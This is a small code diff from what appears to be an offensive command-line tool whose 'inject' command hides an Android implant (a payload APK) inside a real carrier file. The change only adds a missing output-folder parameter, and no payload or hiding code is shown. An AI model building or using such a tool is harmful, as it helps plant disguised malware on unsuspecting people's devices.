@@ -155,7 +155,7 @@ def setup(dest: str, no_ndk: bool, check: bool) -> None:
 @click.option("--spec", default="", help="implant spec to build when no APK exists")
 @click.option("--apk", "apk_path", default="", help="payload APK (defaults to the newest build)")
 @click.option("--out", default="", help="output folder")
-def inject(carrier, spec, apk_path):
+def inject(carrier, spec, apk_path, out: str = ""):
     """Hide the implant inside a real file and verify the container."""
     from hashlib import sha256
 
